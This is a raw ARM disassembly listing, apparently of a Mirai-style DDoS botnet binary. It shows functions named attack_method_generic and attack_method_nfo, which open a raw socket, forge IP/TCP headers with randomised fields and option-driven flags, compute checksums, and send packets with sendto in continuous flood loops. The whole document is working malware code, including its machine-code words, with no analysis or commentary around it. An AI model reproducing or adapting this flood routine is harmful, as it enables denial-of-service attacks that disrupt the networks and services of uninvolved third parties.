    ccf8:	e3a03901 	mov	r3, #16384	; 0x4000
    ccfc:	e3a0c010 	mov	ip, #16
    cd00:	e1a01005 	mov	r1, r5
    cd04:	e1a0000b 	mov	r0, fp
    cd08:	e1a02009 	mov	r2, r9
    cd0c:	e58de000 	str	lr, [sp]
    cd10:	e58dc004 	str	ip, [sp, #4]
    cd14:	eb00289a 	bl	16f84 <__libc_sendto>
    cd18:	e59d304c 	ldr	r3, [sp, #76]	; 0x4c
    cd1c:	e2830001 	add	r0, r3, #1
    cd20:	e1500007 	cmp	r0, r7
    cd24:	e58d004c 	str	r0, [sp, #76]	; 0x4c
    cd28:	baffffc4 	blt	cc40 <attack_method_generic+0x30c>
    cd2c:	e3a03000 	mov	r3, #0
    cd30:	e3570000 	cmp	r7, #0
    cd34:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    cd38:	0affffbb 	beq	cc2c <attack_method_generic+0x2f8>
    cd3c:	eaffffbe 	b	cc3c <attack_method_generic+0x308>
    cd40:	e5934010 	ldr	r4, [r3, #16]
    cd44:	eb00162b 	bl	125f8 <rand_next>
    cd48:	e59d304c 	ldr	r3, [sp, #76]	; 0x4c
    cd4c:	e1a01283 	lsl	r1, r3, #5
    cd50:	e0411183 	sub	r1, r1, r3, lsl #3
    cd54:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    cd58:	e1a02c24 	lsr	r2, r4, #24
    cd5c:	e182242c 	orr	r2, r2, ip, lsr #8
    cd60:	e0811008 	add	r1, r1, r8
    cd64:	e2043cff 	and	r3, r4, #65280	; 0xff00
    cd68:	e5d1c014 	ldrb	ip, [r1, #20]
    cd6c:	e1822403 	orr	r2, r2, r3, lsl #8
    cd70:	e1822c04 	orr	r2, r2, r4, lsl #24
    cd74:	e0822c30 	add	r2, r2, r0, lsr ip
    cd78:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    cd7c:	e1a03c22 	lsr	r3, r2, #24
    cd80:	e1833420 	orr	r3, r3, r0, lsr #8
    cd84:	e2021cff 	and	r1, r2, #65280	; 0xff00
    cd88:	e1833401 	orr	r3, r3, r1, lsl #8
    cd8c:	e1833c02 	orr	r3, r3, r2, lsl #24
    cd90:	e5853010 	str	r3, [r5, #16]
    cd94:	e59d3018 	ldr	r3, [sp, #24]
    cd98:	e3730001 	cmn	r3, #1
    cd9c:	1affffb3 	bne	cc70 <attack_method_generic+0x33c>
    cda0:	eb001614 	bl	125f8 <rand_next>
    cda4:	e3a04801 	mov	r4, #65536	; 0x10000
    cda8:	e59dc020 	ldr	ip, [sp, #32]
    cdac:	e2444001 	sub	r4, r4, #1
    cdb0:	e15c0004 	cmp	ip, r4
    cdb4:	e585000c 	str	r0, [r5, #12]
    cdb8:	1affffb1 	bne	cc84 <attack_method_generic+0x350>
    cdbc:	eb00160d 	bl	125f8 <rand_next>
    cdc0:	e1c500b4 	strh	r0, [r5, #4]
    cdc4:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    cdc8:	e1500004 	cmp	r0, r4
    cdcc:	1affffaf 	bne	cc90 <attack_method_generic+0x35c>
    cdd0:	eb001608 	bl	125f8 <rand_next>
    cdd4:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
    cdd8:	e1510004 	cmp	r1, r4
    cddc:	e1c501b4 	strh	r0, [r5, #20]
    cde0:	1affffad 	bne	cc9c <attack_method_generic+0x368>
    cde4:	eb001603 	bl	125f8 <rand_next>
    cde8:	e59d3034 	ldr	r3, [sp, #52]	; 0x34
    cdec:	e3530000 	cmp	r3, #0
    cdf0:	e1c600b2 	strh	r0, [r6, #2]
    cdf4:	0affffab 	beq	cca8 <attack_method_generic+0x374>
    cdf8:	e285001c 	add	r0, r5, #28
    cdfc:	e59d1044 	ldr	r1, [sp, #68]	; 0x44
    ce00:	eb001661 	bl	1278c <rand_str>
    ce04:	eaffffa7 	b	cca8 <attack_method_generic+0x374>
    ce08:	e1a0000b 	mov	r0, fp
    ce0c:	eb00340b 	bl	19e40 <__GI___libc_close>
    ce10:	e28dd054 	add	sp, sp, #84	; 0x54
    ce14:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    ce18:	e12fff1e 	bx	lr
    ce1c:	0002b8ac 	.word	0x0002b8ac

0000ce20 <attack_method_nfo>:
    ce20:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    ce24:	e1a08001 	mov	r8, r1
    ce28:	e24dd0a4 	sub	sp, sp, #164	; 0xa4
    ce2c:	e3a01004 	mov	r1, #4
    ce30:	e1a04002 	mov	r4, r2
    ce34:	e1a05003 	mov	r5, r3
    ce38:	e1a07000 	mov	r7, r0
    ce3c:	eb002b66 	bl	17bdc <calloc>
    ce40:	e1a01005 	mov	r1, r5
    ce44:	e58d0030 	str	r0, [sp, #48]	; 0x30
    ce48:	e3a02002 	mov	r2, #2
    ce4c:	e3a03000 	mov	r3, #0
    ce50:	e1a00004 	mov	r0, r4
    ce54:	ebfff539 	bl	a340 <attack_get_opt_int>
    ce58:	e3a03801 	mov	r3, #65536	; 0x10000
    ce5c:	e1a0c000 	mov	ip, r0
    ce60:	e20cc0ff 	and	ip, ip, #255	; 0xff
    ce64:	e2433001 	sub	r3, r3, #1
    ce68:	e3a02003 	mov	r2, #3
    ce6c:	e1a01005 	mov	r1, r5
    ce70:	e1a00004 	mov	r0, r4
    ce74:	e58dc054 	str	ip, [sp, #84]	; 0x54
    ce78:	ebfff530 	bl	a340 <attack_get_opt_int>
    ce7c:	e1a01005 	mov	r1, r5
    ce80:	e3a02004 	mov	r2, #4
    ce84:	e3a03040 	mov	r3, #64	; 0x40
    ce88:	e1a0b000 	mov	fp, r0
    ce8c:	e1a00004 	mov	r0, r4
    ce90:	ebfff52a 	bl	a340 <attack_get_opt_int>
    ce94:	e1a0c000 	mov	ip, r0
    ce98:	e20cc0ff 	and	ip, ip, #255	; 0xff
    ce9c:	e1a01005 	mov	r1, r5
    cea0:	e3a02005 	mov	r2, #5
    cea4:	e3a03001 	mov	r3, #1
    cea8:	e1a00004 	mov	r0, r4
    ceac:	e58dc05c 	str	ip, [sp, #92]	; 0x5c
    ceb0:	ebfff522 	bl	a340 <attack_get_opt_int>
    ceb4:	e3a03801 	mov	r3, #65536	; 0x10000
    ceb8:	e1a0c000 	mov	ip, r0
    cebc:	e20cc0ff 	and	ip, ip, #255	; 0xff
    cec0:	e2433001 	sub	r3, r3, #1
    cec4:	e3a02006 	mov	r2, #6
    cec8:	e1a01005 	mov	r1, r5
    cecc:	e1a00004 	mov	r0, r4
    ced0:	e58dc060 	str	ip, [sp, #96]	; 0x60
    ced4:	ebfff519 	bl	a340 <attack_get_opt_int>
    ced8:	e3a03801 	mov	r3, #65536	; 0x10000
    cedc:	e1a01005 	mov	r1, r5
    cee0:	e2433001 	sub	r3, r3, #1
    cee4:	e3a02007 	mov	r2, #7
    cee8:	e1a09000 	mov	r9, r0
    ceec:	e1a00004 	mov	r0, r4
    cef0:	ebfff512 	bl	a340 <attack_get_opt_int>
    cef4:	e3a03801 	mov	r3, #65536	; 0x10000
    cef8:	e1a01005 	mov	r1, r5
    cefc:	e2433001 	sub	r3, r3, #1
    cf00:	e3a02011 	mov	r2, #17
    cf04:	e1a06000 	mov	r6, r0
    cf08:	e1a00004 	mov	r0, r4
    cf0c:	ebfff50b 	bl	a340 <attack_get_opt_int>
    cf10:	e3a03801 	mov	r3, #65536	; 0x10000
    cf14:	e58d0034 	str	r0, [sp, #52]	; 0x34
    cf18:	e1a01005 	mov	r1, r5
    cf1c:	e2433001 	sub	r3, r3, #1
    cf20:	e3a02012 	mov	r2, #18
    cf24:	e1a00004 	mov	r0, r4
    cf28:	ebfff504 	bl	a340 <attack_get_opt_int>
    cf2c:	e1a01005 	mov	r1, r5
    cf30:	e58d0038 	str	r0, [sp, #56]	; 0x38
    cf34:	e3a0200b 	mov	r2, #11
    cf38:	e3a03001 	mov	r3, #1
    cf3c:	e1a00004 	mov	r0, r4
    cf40:	ebfff4fe 	bl	a340 <attack_get_opt_int>
    cf44:	e1a01005 	mov	r1, r5
    cf48:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    cf4c:	e3a0200c 	mov	r2, #12
    cf50:	e3a03001 	mov	r3, #1
    cf54:	e1a00004 	mov	r0, r4
    cf58:	ebfff4f8 	bl	a340 <attack_get_opt_int>
    cf5c:	e1a01005 	mov	r1, r5
    cf60:	e58d0040 	str	r0, [sp, #64]	; 0x40
    cf64:	e3a0200d 	mov	r2, #13
    cf68:	e3a03001 	mov	r3, #1
    cf6c:	e1a00004 	mov	r0, r4
    cf70:	ebfff4f2 	bl	a340 <attack_get_opt_int>
    cf74:	e1a01005 	mov	r1, r5
    cf78:	e58d0044 	str	r0, [sp, #68]	; 0x44
    cf7c:	e3a0200e 	mov	r2, #14
    cf80:	e3a03001 	mov	r3, #1
    cf84:	e1a00004 	mov	r0, r4
    cf88:	ebfff4ec 	bl	a340 <attack_get_opt_int>
    cf8c:	e1a01005 	mov	r1, r5
    cf90:	e58d0048 	str	r0, [sp, #72]	; 0x48
    cf94:	e3a0200f 	mov	r2, #15
    cf98:	e3a03001 	mov	r3, #1
    cf9c:	e1a00004 	mov	r0, r4
    cfa0:	ebfff4e6 	bl	a340 <attack_get_opt_int>
    cfa4:	e1a01005 	mov	r1, r5
    cfa8:	e58d004c 	str	r0, [sp, #76]	; 0x4c
    cfac:	e3a02010 	mov	r2, #16
    cfb0:	e3a03001 	mov	r3, #1
    cfb4:	e1a00004 	mov	r0, r4
    cfb8:	ebfff4e0 	bl	a340 <attack_get_opt_int>
    cfbc:	e1a01005 	mov	r1, r5
    cfc0:	e58d0050 	str	r0, [sp, #80]	; 0x50
    cfc4:	e3a02000 	mov	r2, #0
    cfc8:	e3a03080 	mov	r3, #128	; 0x80
    cfcc:	e1a00004 	mov	r0, r4
    cfd0:	ebfff4da 	bl	a340 <attack_get_opt_int>
    cfd4:	e3a02001 	mov	r2, #1
    cfd8:	e1a03002 	mov	r3, r2
    cfdc:	e58d0084 	str	r0, [sp, #132]	; 0x84
    cfe0:	e1a01005 	mov	r1, r5
    cfe4:	e1a00004 	mov	r0, r4
    cfe8:	ebfff4d4 	bl	a340 <attack_get_opt_int>
    cfec:	e1a0c000 	mov	ip, r0
    cff0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    cff4:	e1a01005 	mov	r1, r5
    cff8:	e3a02019 	mov	r2, #25
    cffc:	e3e03000 	mvn	r3, #0
    d000:	e1a00004 	mov	r0, r4
    d004:	e58dc088 	str	ip, [sp, #136]	; 0x88
    d008:	ebfff4b1 	bl	a2d4 <attack_get_opt_ip>
    d00c:	e3a01003 	mov	r1, #3
    d010:	e58d008c 	str	r0, [sp, #140]	; 0x8c
    d014:	e3a02006 	mov	r2, #6
    d018:	e3a00002 	mov	r0, #2
    d01c:	eb00280c 	bl	17054 <__GI_socket>
    d020:	e3700001 	cmn	r0, #1
    d024:	e1a0a000 	mov	sl, r0
    d028:	0a000196 	beq	d688 <attack_method_nfo+0x868>
    d02c:	e28d30a0 	add	r3, sp, #160	; 0xa0
    d030:	e3a02001 	mov	r2, #1
    d034:	e5232004 	str	r2, [r3, #-4]!
    d038:	e3a0c004 	mov	ip, #4
    d03c:	e3a01000 	mov	r1, #0
    d040:	e2822002 	add	r2, r2, #2
    d044:	e58dc000 	str	ip, [sp]
    d048:	eb0027ef 	bl	1700c <__GI_setsockopt>
    d04c:	e3700001 	cmn	r0, #1
    d050:	0a00018a 	beq	d680 <attack_method_nfo+0x860>
    d054:	e59dc03c 	ldr	ip, [sp, #60]	; 0x3c
    d058:	e1a0580b 	lsl	r5, fp, #16
    d05c:	e1a06806 	lsl	r6, r6, #16
    d060:	e1a0b809 	lsl	fp, r9, #16
    d064:	e3a00000 	mov	r0, #0
    d068:	e1a01825 	lsr	r1, r5, #16
    d06c:	e1a0282b 	lsr	r2, fp, #16
    d070:	e1a03826 	lsr	r3, r6, #16
    d074:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d078:	e58d009c 	str	r0, [sp, #156]	; 0x9c
    d07c:	e58d1058 	str	r1, [sp, #88]	; 0x58
    d080:	e58d2064 	str	r2, [sp, #100]	; 0x64
    d084:	e58d3068 	str	r3, [sp, #104]	; 0x68
    d088:	e58dc06c 	str	ip, [sp, #108]	; 0x6c
    d08c:	e28d0040 	add	r0, sp, #64	; 0x40
    d090:	e890000f 	ldm	r0, {r0, r1, r2, r3}
    d094:	e59dc050 	ldr	ip, [sp, #80]	; 0x50
    d098:	e20000ff 	and	r0, r0, #255	; 0xff
    d09c:	e20110ff 	and	r1, r1, #255	; 0xff
    d0a0:	e20220ff 	and	r2, r2, #255	; 0xff
    d0a4:	e20330ff 	and	r3, r3, #255	; 0xff
    d0a8:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d0ac:	e3570000 	cmp	r7, #0
    d0b0:	e58d602c 	str	r6, [sp, #44]	; 0x2c
    d0b4:	e58d0070 	str	r0, [sp, #112]	; 0x70
    d0b8:	e58d1074 	str	r1, [sp, #116]	; 0x74
    d0bc:	e58d2078 	str	r2, [sp, #120]	; 0x78
    d0c0:	e58d307c 	str	r3, [sp, #124]	; 0x7c
    d0c4:	e58dc080 	str	ip, [sp, #128]	; 0x80
    d0c8:	0a000171 	beq	d694 <attack_method_nfo+0x874>
    d0cc:	e59d0084 	ldr	r0, [sp, #132]	; 0x84
    d0d0:	e1a00800 	lsl	r0, r0, #16
    d0d4:	e280e70a 	add	lr, r0, #2621440	; 0x280000
    d0d8:	e59d1034 	ldr	r1, [sp, #52]	; 0x34
    d0dc:	e59dc058 	ldr	ip, [sp, #88]	; 0x58
    d0e0:	e58d0010 	str	r0, [sp, #16]
    d0e4:	e59d0064 	ldr	r0, [sp, #100]	; 0x64
    d0e8:	e1a04801 	lsl	r4, r1, #16
    d0ec:	e1a02c0c 	lsl	r2, ip, #24
    d0f0:	e1a01c00 	lsl	r1, r0, #24
    d0f4:	e59dc068 	ldr	ip, [sp, #104]	; 0x68
    d0f8:	e1a02822 	lsr	r2, r2, #16
    d0fc:	e1a01821 	lsr	r1, r1, #16
    d100:	e1a00c0c 	lsl	r0, ip, #24
    d104:	e1829c25 	orr	r9, r2, r5, lsr #24
    d108:	e181bc2b 	orr	fp, r1, fp, lsr #24
    d10c:	e59d203c 	ldr	r2, [sp, #60]	; 0x3c
    d110:	e59d102c 	ldr	r1, [sp, #44]	; 0x2c
    d114:	e1a0c404 	lsl	ip, r4, #8
    d118:	e1a0340e 	lsl	r3, lr, #8
    d11c:	e1a00820 	lsr	r0, r0, #16
    d120:	e1800c21 	orr	r0, r0, r1, lsr #24
    d124:	e1a03823 	lsr	r3, r3, #16
    d128:	e1a0c82c 	lsr	ip, ip, #16
    d12c:	e2022001 	and	r2, r2, #1
    d130:	e18c4c24 	orr	r4, ip, r4, lsr #24
    d134:	e1836c2e 	orr	r6, r3, lr, lsr #24
    d138:	e58d0094 	str	r0, [sp, #148]	; 0x94
    d13c:	e58d2014 	str	r2, [sp, #20]
    d140:	e28d3040 	add	r3, sp, #64	; 0x40
    d144:	e8931008 	ldm	r3, {r3, ip}
    d148:	e28d0048 	add	r0, sp, #72	; 0x48
    d14c:	e8900007 	ldm	r0, {r0, r1, r2}
    d150:	e2033001 	and	r3, r3, #1
    d154:	e20cc001 	and	ip, ip, #1
    d158:	e2000001 	and	r0, r0, #1
    d15c:	e2011001 	and	r1, r1, #1
    d160:	e2022001 	and	r2, r2, #1
    d164:	e58d3018 	str	r3, [sp, #24]
    d168:	e58dc01c 	str	ip, [sp, #28]
    d16c:	e58d0020 	str	r0, [sp, #32]
    d170:	e58d1024 	str	r1, [sp, #36]	; 0x24
    d174:	e58d2028 	str	r2, [sp, #40]	; 0x28
    d178:	e58d4090 	str	r4, [sp, #144]	; 0x90
    d17c:	e3a04000 	mov	r4, #0
    d180:	e3a00e5e 	mov	r0, #1504	; 0x5e0
    d184:	e3a01001 	mov	r1, #1
    d188:	e2800006 	add	r0, r0, #6
    d18c:	eb002a92 	bl	17bdc <calloc>
    d190:	e59d3030 	ldr	r3, [sp, #48]	; 0x30
    d194:	e59d209c 	ldr	r2, [sp, #156]	; 0x9c
    d198:	e7830104 	str	r0, [r3, r4, lsl #2]
    d19c:	e59dc030 	ldr	ip, [sp, #48]	; 0x30
    d1a0:	e1a03282 	lsl	r3, r2, #5
    d1a4:	e79c5102 	ldr	r5, [ip, r2, lsl #2]
    d1a8:	e0433182 	sub	r3, r3, r2, lsl #3
    d1ac:	e0831008 	add	r1, r3, r8
    d1b0:	e5d53000 	ldrb	r3, [r5]
    d1b4:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    d1b8:	e3833040 	orr	r3, r3, #64	; 0x40
    d1bc:	e5c53000 	strb	r3, [r5]
    d1c0:	e5d52000 	ldrb	r2, [r5]
    d1c4:	e3c2200a 	bic	r2, r2, #10
    d1c8:	e3822005 	orr	r2, r2, #5
    d1cc:	e59d0060 	ldr	r0, [sp, #96]	; 0x60
    d1d0:	e5c52000 	strb	r2, [r5]
    d1d4:	e59d2054 	ldr	r2, [sp, #84]	; 0x54
    d1d8:	e5c52001 	strb	r2, [r5, #1]
    d1dc:	e59d305c 	ldr	r3, [sp, #92]	; 0x5c
    d1e0:	e5c53008 	strb	r3, [r5, #8]
    d1e4:	e3a03006 	mov	r3, #6
    d1e8:	e5c53009 	strb	r3, [r5, #9]
    d1ec:	e3500000 	cmp	r0, #0
    d1f0:	e59d008c 	ldr	r0, [sp, #140]	; 0x8c
    d1f4:	e585000c 	str	r0, [r5, #12]
    d1f8:	e5913010 	ldr	r3, [r1, #16]
    d1fc:	13a0c040 	movne	ip, #64	; 0x40
    d200:	11c5c0b6 	strhne	ip, [r5, #6]
    d204:	e1c560b2 	strh	r6, [r5, #2]
    d208:	e1c590b4 	strh	r9, [r5, #4]
    d20c:	e5853010 	str	r3, [r5, #16]
    d210:	e1c5b1b4 	strh	fp, [r5, #20]
    d214:	e2854014 	add	r4, r5, #20
    d218:	e5d4300c 	ldrb	r3, [r4, #12]
    d21c:	e5d4200d 	ldrb	r2, [r4, #13]
    d220:	e59d1014 	ldr	r1, [sp, #20]
    d224:	e3c330a0 	bic	r3, r3, #160	; 0xa0
    d228:	e3833050 	orr	r3, r3, #80	; 0x50
    d22c:	e3c22020 	bic	r2, r2, #32
    d230:	e5c4300c 	strb	r3, [r4, #12]
    d234:	e1822281 	orr	r2, r2, r1, lsl #5
    d238:	e59d3094 	ldr	r3, [sp, #148]	; 0x94
    d23c:	e59dc090 	ldr	ip, [sp, #144]	; 0x90
    d240:	e5c4200d 	strb	r2, [r4, #13]
    d244:	e1c430b2 	strh	r3, [r4, #2]
    d248:	e5d4300d 	ldrb	r3, [r4, #13]
    d24c:	e59d0018 	ldr	r0, [sp, #24]
    d250:	e3c33010 	bic	r3, r3, #16
    d254:	e1833200 	orr	r3, r3, r0, lsl #4
    d258:	e584c004 	str	ip, [r4, #4]
    d25c:	e5c4300d 	strb	r3, [r4, #13]
    d260:	e5d4200d 	ldrb	r2, [r4, #13]
    d264:	e59d101c 	ldr	r1, [sp, #28]
    d268:	e3c22008 	bic	r2, r2, #8
    d26c:	e1822181 	orr	r2, r2, r1, lsl #3
    d270:	e5c4200d 	strb	r2, [r4, #13]
    d274:	e5d4300d 	ldrb	r3, [r4, #13]
    d278:	e59d2020 	ldr	r2, [sp, #32]
    d27c:	e3c33004 	bic	r3, r3, #4
    d280:	e1833102 	orr	r3, r3, r2, lsl #2
    d284:	e5c4300d 	strb	r3, [r4, #13]
    d288:	e5d4200d 	ldrb	r2, [r4, #13]
    d28c:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    d290:	e3c22002 	bic	r2, r2, #2
    d294:	e1822083 	orr	r2, r2, r3, lsl #1
    d298:	e5c4200d 	strb	r2, [r4, #13]
    d29c:	e5d4300d 	ldrb	r3, [r4, #13]
    d2a0:	e59dc028 	ldr	ip, [sp, #40]	; 0x28
    d2a4:	e3c33001 	bic	r3, r3, #1
    d2a8:	e18c3003 	orr	r3, ip, r3
    d2ac:	e5c4300d 	strb	r3, [r4, #13]
    d2b0:	eb0014d0 	bl	125f8 <rand_next>
    d2b4:	e59d1084 	ldr	r1, [sp, #132]	; 0x84
    d2b8:	e1c400be 	strh	r0, [r4, #14]
    d2bc:	e2850028 	add	r0, r5, #40	; 0x28
    d2c0:	eb001531 	bl	1278c <rand_str>
    d2c4:	e59d309c 	ldr	r3, [sp, #156]	; 0x9c
    d2c8:	e2834001 	add	r4, r3, #1
    d2cc:	e1540007 	cmp	r4, r7
    d2d0:	e58d409c 	str	r4, [sp, #156]	; 0x9c
    d2d4:	baffffa9 	blt	d180 <attack_method_nfo+0x360>
    d2d8:	e59d0084 	ldr	r0, [sp, #132]	; 0x84
    d2dc:	e2809014 	add	r9, r0, #20
    d2e0:	e280b028 	add	fp, r0, #40	; 0x28
    d2e4:	e59d3010 	ldr	r3, [sp, #16]
    d2e8:	e2832705 	add	r2, r3, #1310720	; 0x140000
    d2ec:	e1a03402 	lsl	r3, r2, #8
    d2f0:	e1a03823 	lsr	r3, r3, #16
    d2f4:	e1832c22 	orr	r2, r3, r2, lsr #24
    d2f8:	e58d200c 	str	r2, [sp, #12]
    d2fc:	e3a03000 	mov	r3, #0
    d300:	e3570000 	cmp	r7, #0
    d304:	e58d309c 	str	r3, [sp, #156]	; 0x9c
    d308:	0afffffb 	beq	d2fc <attack_method_nfo+0x4dc>
    d30c:	e1a00003 	mov	r0, r3
    d310:	e1a03280 	lsl	r3, r0, #5
    d314:	e0433180 	sub	r3, r3, r0, lsl #3
    d318:	e0833008 	add	r3, r3, r8
    d31c:	e59dc030 	ldr	ip, [sp, #48]	; 0x30
    d320:	e5d32014 	ldrb	r2, [r3, #20]
    d324:	e79c6100 	ldr	r6, [ip, r0, lsl #2]
    d328:	e352001f 	cmp	r2, #31
    d32c:	e2865014 	add	r5, r6, #20
    d330:	9a00004e 	bls	d470 <attack_method_nfo+0x650>
    d334:	e59d008c 	ldr	r0, [sp, #140]	; 0x8c
    d338:	e3700001 	cmn	r0, #1
    d33c:	0a000063 	beq	d4d0 <attack_method_nfo+0x6b0>
    d340:	e3a04801 	mov	r4, #65536	; 0x10000
    d344:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    d348:	e2444001 	sub	r4, r4, #1
    d34c:	e1510004 	cmp	r1, r4
    d350:	0a000065 	beq	d4ec <attack_method_nfo+0x6cc>
    d354:	e59d2064 	ldr	r2, [sp, #100]	; 0x64
    d358:	e1520004 	cmp	r2, r4
    d35c:	0a000067 	beq	d500 <attack_method_nfo+0x6e0>
    d360:	e59d3068 	ldr	r3, [sp, #104]	; 0x68
    d364:	e1530004 	cmp	r3, r4
    d368:	0a000069 	beq	d514 <attack_method_nfo+0x6f4>
    d36c:	e59dc034 	ldr	ip, [sp, #52]	; 0x34
    d370:	e15c0004 	cmp	ip, r4
    d374:	0a00006b 	beq	d528 <attack_method_nfo+0x708>
    d378:	e59d0038 	ldr	r0, [sp, #56]	; 0x38
    d37c:	e1500004 	cmp	r0, r4
    d380:	0a00006d 	beq	d53c <attack_method_nfo+0x71c>
    d384:	e59d106c 	ldr	r1, [sp, #108]	; 0x6c
    d388:	e3510000 	cmp	r1, #0
    d38c:	1a00006f 	bne	d550 <attack_method_nfo+0x730>
    d390:	e59d2070 	ldr	r2, [sp, #112]	; 0x70
    d394:	e3520000 	cmp	r2, #0
    d398:	1a000078 	bne	d580 <attack_method_nfo+0x760>
    d39c:	e59d3074 	ldr	r3, [sp, #116]	; 0x74
    d3a0:	e3530000 	cmp	r3, #0
    d3a4:	1a000081 	bne	d5b0 <attack_method_nfo+0x790>
    d3a8:	e59dc078 	ldr	ip, [sp, #120]	; 0x78
    d3ac:	e35c0000 	cmp	ip, #0
    d3b0:	1a00008a 	bne	d5e0 <attack_method_nfo+0x7c0>
    d3b4:	e59d007c 	ldr	r0, [sp, #124]	; 0x7c
    d3b8:	e3500000 	cmp	r0, #0
    d3bc:	1a000093 	bne	d610 <attack_method_nfo+0x7f0>
    d3c0:	e59d1080 	ldr	r1, [sp, #128]	; 0x80
    d3c4:	e3510000 	cmp	r1, #0
    d3c8:	1a00009c 	bne	d640 <attack_method_nfo+0x820>
    d3cc:	e59d2088 	ldr	r2, [sp, #136]	; 0x88
    d3d0:	e3520000 	cmp	r2, #0
    d3d4:	1a0000a5 	bne	d670 <attack_method_nfo+0x850>
    d3d8:	e3a03000 	mov	r3, #0
    d3dc:	e1c630ba 	strh	r3, [r6, #10]
    d3e0:	e3a01014 	mov	r1, #20
    d3e4:	e1a00006 	mov	r0, r6
    d3e8:	eb000520 	bl	e870 <checksum_generic>
    d3ec:	e3a0c000 	mov	ip, #0
    d3f0:	e1c600ba 	strh	r0, [r6, #10]
    d3f4:	e1a01005 	mov	r1, r5
    d3f8:	e1c5c1b0 	strh	ip, [r5, #16]
    d3fc:	e59d200c 	ldr	r2, [sp, #12]
    d400:	e1a03009 	mov	r3, r9
    d404:	e1a00006 	mov	r0, r6
    d408:	eb00052c 	bl	e8c0 <checksum_tcpudp>
    d40c:	e59d309c 	ldr	r3, [sp, #156]	; 0x9c
    d410:	e1a0e283 	lsl	lr, r3, #5
    d414:	e1c501b0 	strh	r0, [r5, #16]
    d418:	e04ee183 	sub	lr, lr, r3, lsl #3
    d41c:	e1d550b2 	ldrh	r5, [r5, #2]
    d420:	e08ee008 	add	lr, lr, r8
    d424:	e1ce50b2 	strh	r5, [lr, #2]
    d428:	e3a03901 	mov	r3, #16384	; 0x4000
    d42c:	e3a0c010 	mov	ip, #16
    d430:	e1a01006 	mov	r1, r6
    d434:	e1a0000a 	mov	r0, sl
    d438:	e1a0200b 	mov	r2, fp
    d43c:	e58de000 	str	lr, [sp]
    d440:	e58dc004 	str	ip, [sp, #4]
    d444:	eb0026ce 	bl	16f84 <__libc_sendto>
    d448:	e59d309c 	ldr	r3, [sp, #156]	; 0x9c
    d44c:	e2830001 	add	r0, r3, #1
    d450:	e1500007 	cmp	r0, r7
    d454:	e58d009c 	str	r0, [sp, #156]	; 0x9c
    d458:	baffffac 	blt	d310 <attack_method_nfo+0x4f0>
    d45c:	e3a03000 	mov	r3, #0
    d460:	e3570000 	cmp	r7, #0
    d464:	e58d309c 	str	r3, [sp, #156]	; 0x9c
    d468:	0affffa3 	beq	d2fc <attack_method_nfo+0x4dc>
    d46c:	eaffffa6 	b	d30c <attack_method_nfo+0x4ec>
    d470:	e5934010 	ldr	r4, [r3, #16]
    d474:	eb00145f 	bl	125f8 <rand_next>
    d478:	e59d309c 	ldr	r3, [sp, #156]	; 0x9c
    d47c:	e1a01283 	lsl	r1, r3, #5
    d480:	e0411183 	sub	r1, r1, r3, lsl #3
    d484:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    d488:	e1a02c24 	lsr	r2, r4, #24
    d48c:	e182242c 	orr	r2, r2, ip, lsr #8
    d490:	e0811008 	add	r1, r1, r8
    d494:	e2043cff 	and	r3, r4, #65280	; 0xff00
    d498:	e5d1c014 	ldrb	ip, [r1, #20]
    d49c:	e1822403 	orr	r2, r2, r3, lsl #8
    d4a0:	e1822c04 	orr	r2, r2, r4, lsl #24
    d4a4:	e0822c30 	add	r2, r2, r0, lsr ip
    d4a8:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    d4ac:	e1a03c22 	lsr	r3, r2, #24
    d4b0:	e1833420 	orr	r3, r3, r0, lsr #8
    d4b4:	e2021cff 	and	r1, r2, #65280	; 0xff00
    d4b8:	e59d008c 	ldr	r0, [sp, #140]	; 0x8c
    d4bc:	e1833401 	orr	r3, r3, r1, lsl #8
    d4c0:	e1833c02 	orr	r3, r3, r2, lsl #24
    d4c4:	e3700001 	cmn	r0, #1
    d4c8:	e5863010 	str	r3, [r6, #16]
    d4cc:	1affff9b 	bne	d340 <attack_method_nfo+0x520>
    d4d0:	eb001448 	bl	125f8 <rand_next>
    d4d4:	e3a04801 	mov	r4, #65536	; 0x10000
    d4d8:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    d4dc:	e2444001 	sub	r4, r4, #1
    d4e0:	e1510004 	cmp	r1, r4
    d4e4:	e586000c 	str	r0, [r6, #12]
    d4e8:	1affff99 	bne	d354 <attack_method_nfo+0x534>
    d4ec:	eb001441 	bl	125f8 <rand_next>
    d4f0:	e59d2064 	ldr	r2, [sp, #100]	; 0x64
    d4f4:	e1520004 	cmp	r2, r4
    d4f8:	e1c600b4 	strh	r0, [r6, #4]
    d4fc:	1affff97 	bne	d360 <attack_method_nfo+0x540>
    d500:	eb00143c 	bl	125f8 <rand_next>
    d504:	e59d3068 	ldr	r3, [sp, #104]	; 0x68
    d508:	e1530004 	cmp	r3, r4
    d50c:	e1c601b4 	strh	r0, [r6, #20]
    d510:	1affff95 	bne	d36c <attack_method_nfo+0x54c>
    d514:	eb001437 	bl	125f8 <rand_next>
    d518:	e59dc034 	ldr	ip, [sp, #52]	; 0x34
    d51c:	e15c0004 	cmp	ip, r4
    d520:	e1c500b2 	strh	r0, [r5, #2]
    d524:	1affff93 	bne	d378 <attack_method_nfo+0x558>
    d528:	eb001432 	bl	125f8 <rand_next>
    d52c:	e5850004 	str	r0, [r5, #4]
    d530:	e59d0038 	ldr	r0, [sp, #56]	; 0x38
    d534:	e1500004 	cmp	r0, r4
    d538:	1affff91 	bne	d384 <attack_method_nfo+0x564>
    d53c:	eb00142d 	bl	125f8 <rand_next>
    d540:	e59d106c 	ldr	r1, [sp, #108]	; 0x6c
    d544:	e3510000 	cmp	r1, #0
    d548:	e5850008 	str	r0, [r5, #8]
    d54c:	0affff8f 	beq	d390 <attack_method_nfo+0x570>
